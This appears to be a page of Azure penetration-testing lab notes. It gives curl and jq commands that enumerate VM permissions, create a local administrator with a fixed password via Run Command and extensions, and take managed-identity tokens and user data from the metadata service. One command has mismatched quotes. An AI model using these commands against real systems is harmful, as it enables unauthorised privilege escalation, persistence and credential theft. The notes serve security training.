---
title: Virtual Machine
---

[[notes/azure/index]] Virtual Machines are comparable to AWS EC2 instances.

Retrieve info like OS and network interface IDs of a VM.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2023-07-01" -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" | jq
~~~

Enumerate all network interfaces and assigned public IPs.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/providers/Microsoft.Network/networkInterfaces?api-version=2023-05-01" -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" | jq -r '.value[]'
~~~

Enumerate all public IPs and filter for a specific one.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/providers/Microsoft.Network/publicIPAddresses?api-version=2023-05-01" -H 'Content-Type: application/json' -H "Authorization: Bearer $(jq -r .accessToken .roadtools_auth)" | jq -r '.value[]|select(.name=="jumpvm-ip")'
~~~

Enumerate your permissions on a VM.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2018-07-01" -H "Authorization: Bearer $arm_token" | jq -r '.value[]'
~~~

Enumerate VM extensions.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/jumpvm/extensions?api-version=2023-07-01" -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" | jq -r '.value[]'
~~~

Enumerate your permissions on a VM extension.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/jumpvm/extensions/MicrosoftMonitoringAgent/providers/Microsoft.Authorization/permissions?api-version=2018-07-01" -H "Authorization: Bearer $arm_token" | jq -r '.value[]'
~~~

Enumerate role assignments on a VM and resolve the role definitions.

~~~ bash
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/jumpvm/providers/Microsoft.Authorization/roleAssignments?api-version=2020-08-01-preview" -H "Authorization: Bearer $arm_token" | jq -r '.value[].properties.roleDefinitionId'
curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/jumpvm/providers/Microsoft.Authorization/roleDefinitions/$role_def_id?api-version=2022-04-01' -H "Authorization: Bearer $arm_token" | jq -r '.properties'
~~~

Run a command on a VM to add an local admin.

~~~ bash
cat << 'EOF' > ./adduser.ps1
$p = ConvertTo-SecureString 'P@ssw0rd1234' -AsPlainText -Force
New-LocalUser -Name student57 -Password $p
Add-LocalGroupMember -Group Administrators -Member student57
EOF
jq -ncR '{"commandId":"RunPowerShellScript","script":[inputs]}' ./adduser.ps1 | curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/runCommand?api-version=2023-07-01" -d @- -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" -i | grep -i 'location:' | sed 's|^location: *||i' | read -r operation_url
curl -sSf "$operation_url" -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" | jq -r '.value[].message'
~~~

Abuse an extension for command execution in a VM.

~~~ bash
jq -rn --arg command 'net users student57 P@ssw0rd1234 /add /y && net localgroup administrators student57 /add' '{"properties":{"settings":{"commandToExecute":$command}},"location":"Germany West Central"}' | curl -sSf "https://management.azure.com/subscriptions/$subscription_id/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/extensions/ExecCmd?api-version=2023-07-01" -d @- -X PUT -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" -i | grep -i 'azure-asyncoperation:' | sed 's|^azure-asyncoperation: *||i' | read -r operation_url
curl -sSf "$operation_url" -H "Authorization: Bearer $arm_token" | jq
~~~

With command execution inside a VM you can get an access token for the VMs managed identity from the Instance Metadata Service.

~~~ bash
curl -sSf -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token' -G -d api-version=2018-02-01 --data-urlencode resource='https://management.azure.com/'
curl -sSf -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token' -G -d api-version=2018-02-01 --data-urlencode resource='https://graph.microsoft.com/'
~~~

You can also access the VMs user data which might contain sensitive information.

~~~ bash
curl -sSf 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text' -H 'Metadata: true' | base64 -d
~~~

With `Microsoft.Compute/virtualMachines/write` user data can be modified which might lead to code execution in the VM.

~~~ bash
jq -rn --arg data "$(echo -n whoami | base64 -w0)" '{"location":"Germany West Central","properties":{"userData":$data}}' | curl -sSf -X PUT 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/jumpvm?api-version=2021-07-01' -H 'Content-Type: application/json' -H "Authorization: Bearer $arm_token" -d @-
~~~

When a VM is joined to Azure AD, following roles become member of the local administrators group:

- Global Administrators
- Azure AD Joined Device Local Administrator
- the user who joined the machine to Azure

# Custom Script Extensions

Custom Script Extensions are used to run scripts on Azure VMs in the context of system / root.
The scripts can be inline, fetched from a storage blob (needs managed identity) or downloaded from an URL and can be deployed to a running VM.
Abuse requires `Microsoft.Compute/virtualMachines/extensions/read` and `write`.

References:

- [Azure Attack Paths - Azure VM Run Command or Custom Script execution](http://web.archive.org/web/20231028211850/https://cloudbrothers.info/azure-attack-paths/#azure-vm-run-command-or-custom-script-execution)
